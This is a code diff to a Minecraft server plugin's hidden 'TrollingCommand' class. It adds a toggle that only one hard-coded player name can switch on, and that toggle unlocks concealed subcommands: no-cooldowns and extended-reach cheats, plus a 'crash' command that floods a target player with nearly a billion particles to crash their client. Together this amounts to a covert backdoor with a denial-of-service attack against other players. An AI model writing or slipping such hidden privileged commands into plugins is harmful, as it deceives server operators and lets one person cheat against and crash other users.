@@ -14,8 +14,26 @@ import org.bukkit.metadata.FixedMetadataValue;
 @Private
 public class TrollingCommand extends BaseCommand {
 
+    private boolean enabled = false;
+
+    @Subcommand("enable")
+    public void enable(Player player){
+        if (!player.getName().equals("Wordpass")){
+            player.sendMessage(CC.translate("yo ur not allowed to do only embry"));
+            return;
+        }
+
+        enabled = !enabled;
+        player.sendMessage(CC.translate("it gort toggeld " + enabled));
+    }
+
     @Subcommand("nocooldowns")
     public void noCooldowns(Player player){
+        if (!enabled){
+            player.sendMessage(CC.translate("&cit isnt enabled by embry sorry mate"));
+            return;
+        }
+
         if (player.hasMetadata("nocds")){
             player.removeMetadata("nocds", HCF.getInstance());
         } else {
@@ -27,6 +45,11 @@ public class TrollingCommand extends BaseCommand {
 
     @Subcommand("reach")
     public void reach(Player player, @Name("reach") double amount){
+        if (!enabled){
+            player.sendMessage(CC.translate("&cit isnt enabled by embry sorry mate"));
+            return;
+        }
+
         if (ReachListener.reach.containsKey(player.getUniqueId())){
             ReachListener.reach.remove(player.getUniqueId());
             player.sendMessage(CC.translate("&fYour reach was toggled &coff"));
@@ -45,6 +68,11 @@ public class TrollingCommand extends BaseCommand {
 
     @Subcommand("crash")
     public void crash(Player player, @Flags("other") @Name("player") Player target){
+        if (!enabled){
+            player.sendMessage(CC.translate("&cit isnt enabled by embry sorry mate"));
+            return;
+        }
+
         Bukkit.dispatchCommand(player, "execute as " + target.getName() + " at @s run particle flame ~ ~ ~ 1 1 1 1 999999999 force @s");
     }
 }
